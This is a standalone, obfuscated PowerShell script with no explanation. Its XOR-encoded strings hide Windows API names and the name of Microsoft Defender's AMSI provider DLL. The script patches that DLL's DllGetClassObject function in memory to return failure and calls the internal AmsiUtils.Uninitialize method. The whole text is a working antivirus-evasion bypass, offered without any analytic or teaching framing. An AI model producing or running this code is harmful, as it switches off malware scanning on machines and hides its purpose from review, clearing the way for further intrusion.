
function oxogfsfmiw {

 Param ($moduleName, $functionName)

 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function ipgspbtadm {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
 DefineDynamicModule('InMemoryModule', $false).
 DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
  [System.MulticastDelegate])
  $type.
 DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
 SetImplementationFlags('Runtime, Managed')
 $type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

[Byte[]] $edjwhpodns = 0x1f, 0x15, 0x1f, 0x18, 0x9, 0x1, 0x42, 0x8, 0x0, 0x0
[Byte[]] $ddqgtjrosl = 0x7, 0x9, 0x1e, 0x2, 0x9, 0x0, 0x5f, 0x5e, 0x42, 0x8, 0x0, 0x0
[Byte[]] $hhbzhjjkpk = 0x3a, 0x5, 0x1e, 0x18, 0x19, 0xd
[Byte[]] $alogctwvkt = 0x0, 0x3c, 0x1e, 0x3, 0x18, 0x9, 0xf, 0x18
[Byte[]] $xkymuortso = 0x2d, 0x1, 0x1f
[Byte[]] $qitpdczgyj = 0x21, 0x1c, 0x23, 0xd, 0x1a, 0x42, 0x8, 0x0, 0x0
[Byte[]] $oouciocxyu = 0x5, 0x39, 0x18, 0x5, 0x0, 0x1f
[Byte[]] $xtxrjzreny = 0x2b, 0x9, 0x18, 0x3c, 0x1e
[Byte[]] $elwuahhjkl = 0x3, 0xf, 0x2d, 0x8, 0x8, 0x1e, 0x9, 0x1f, 0x1f
[Byte[]] $batkopvrwb = 0x20, 0x3, 0xd, 0x8, 0x20, 0x5
[Byte[]] $ldynejwoaf = 0xe, 0x1e, 0xd, 0x1e, 0x15, 0x2d

for($i=0; $i -lt $edjwhpodns.count ; $i++)
{
    $edjwhpodns[$i] = $edjwhpodns[$i] -bxor 0x6c
}

$c = [System.Text.Encoding]::ASCII.GetString($edjwhpodns)

for($i=0; $i -lt $ddqgtjrosl.count ; $i++)
{
    $ddqgtjrosl[$i] = $ddqgtjrosl[$i] -bxor 0x6c
}

$d = [System.Text.Encoding]::ASCII.GetString($ddqgtjrosl)

for($i=0; $i -lt $hhbzhjjkpk.count ; $i++)
{
    $hhbzhjjkpk[$i] = $hhbzhjjkpk[$i] -bxor 0x6c
}
$e = [System.Text.Encoding]::ASCII.GetString($hhbzhjjkpk)


for($i=0; $i -lt $alogctwvkt.count ; $i++)
{
    $alogctwvkt[$i] = $alogctwvkt[$i] -bxor 0x6c
}

$f = [System.Text.Encoding]::ASCII.GetString($alogctwvkt)
$e = $e+$f

for($i=0; $i -lt $qitpdczgyj.count ; $i++)
{
    $qitpdczgyj[$i] = $qitpdczgyj[$i] -bxor 0x6c
}

$i = [System.Text.Encoding]::ASCII.GetString($qitpdczgyj)

for($i=0; $i -lt $xkymuortso.count ; $i++)
{
    $xkymuortso[$i] = $xkymuortso[$i] -bxor 0x6c
}

$g = [System.Text.Encoding]::ASCII.GetString($xkymuortso)

for($i=0; $i -lt $oouciocxyu.count ; $i++)
{
    $oouciocxyu[$i] = $oouciocxyu[$i] -bxor 0x6c
}

$j = [System.Text.Encoding]::ASCII.GetString($oouciocxyu)
$g = $g+$j

for($i=0; $i -lt $xtxrjzreny.count ; $i++)
{
    $xtxrjzreny[$i] = $xtxrjzreny[$i] -bxor 0x6c
}

$l = [System.Text.Encoding]::ASCII.GetString($xtxrjzreny)

for($i=0; $i -lt $elwuahhjkl.count ; $i++)
{
    $elwuahhjkl[$i] = $elwuahhjkl[$i] -bxor 0x6c
}

$m = [System.Text.Encoding]::ASCII.GetString($elwuahhjkl)
$l = $l+$m

for($i=0; $i -lt $batkopvrwb.count ; $i++)
{
    $batkopvrwb[$i] = $batkopvrwb[$i] -bxor 0x6c
}

$n = [System.Text.Encoding]::ASCII.GetString($batkopvrwb)

for($i=0; $i -lt $ldynejwoaf.count ; $i++)
{
    $ldynejwoaf[$i] = $ldynejwoaf[$i] -bxor 0x6c
}

$o = [System.Text.Encoding]::ASCII.GetString($ldynejwoaf)
$n = $n+$o

$nctcsppisj = oxogfsfmiw $d $n
$oukdbhhpck = ipgspbtadm @([String]) ([IntPtr])
$hwkuhlfmek = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nctcsppisj,$oukdbhhpck)
$gafldecpsr = oxogfsfmiw $d $l
$ejxxyyinwh = ipgspbtadm @([IntPtr], [String]) ([IntPtr])
$pajrwrlyfc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gafldecpsr,$ejxxyyinwh)
$qbxkbvvwoh = oxogfsfmiw $d $e
$hicnmoqimn = ipgspbtadm @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$wabbozebnz = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qbxkbvvwoh,
$hicnmoqimn)
$hModule = $hwkuhlfmek.Invoke("MpOav.dll")
$nplnaygpdk = $pajrwrlyfc.Invoke($hModule,"DllGetClassObject")
$p = 0
$wabbozebnz.Invoke($nplnaygpdk, [uint32]6, 0x40, [ref]$p)
$qwzevvysgk = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($qwzevvysgk, 0, $nplnaygpdk, 6)
$bzamanohbv = [Ref].Assembly.GetType('System.Management.Automation.'+$g)
$otpjascmnp = $bzamanohbv.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$otpjascmnp.Invoke($bzamanohbv,$null)
